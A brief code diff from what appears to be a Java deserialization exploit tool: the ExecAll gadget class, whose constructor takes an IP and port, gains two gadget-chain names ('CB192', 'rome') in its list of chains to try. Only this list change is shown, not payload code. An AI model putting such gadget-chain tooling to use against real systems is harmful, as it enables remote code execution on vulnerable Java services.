@@ -14,7 +14,7 @@ import java.util.HashMap;
 public class ExecAll implements Gadget {
 
     private ResourceRef ref;
-    private String[] gname = {"jackson2","groovy","CC6","CC4","fastjson"};
+    private String[] gname = {"jackson2","groovy","CC6","CC4","fastjson","CB192","rome"};
     private HashMap map = new ArgsBean().getMap();
 
     public ExecAll(String ip, int port){
